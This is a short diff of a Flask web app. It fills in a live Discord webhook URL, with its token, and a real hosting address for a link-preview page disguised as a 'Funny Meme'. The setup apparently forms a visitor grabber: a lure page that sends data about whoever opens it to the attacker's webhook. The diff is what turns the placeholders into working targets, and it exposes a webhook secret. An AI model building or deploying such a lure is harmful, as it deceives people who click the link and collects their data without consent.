@@ -4,7 +4,7 @@ from flask import Flask, send_file, request
 
    app = Flask(__name__)
 
-   WEBHOOK_URL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1386603806502162514/uUmrt5ouu_waJ6xnSAWxNEyvglx6xWawyQcZoXLdjoApXn1Trgvx3DVlC9tTCcTCt4KC"
+   WEBHOOK_URL = "https://discord.com/api/webhooks/1386603806502162514/uUmrt5ouu_waJ6xnSAWxNEyvglx6xWawyQcZoXLdjoApXn1Trgvx3DVlC9tTCcTCt4KC"
 
    PREVIEW_HTML = """
    <!DOCTYPE html>
@@ -12,7 +12,7 @@ from flask import Flask, send_file, request
    <head>
        <meta property="og:title" content="Funny Meme">
        <meta property="og:description" content="Check out this hilarious image!">
-       <meta property="og:image" content="https://YOUR_SERVER/preview.jpg">
+       <meta property="og:image" content="https://dustrrr.onrender.com/preview.jpg">
        <meta property="og:type" content="website">
    </head>
    <body>
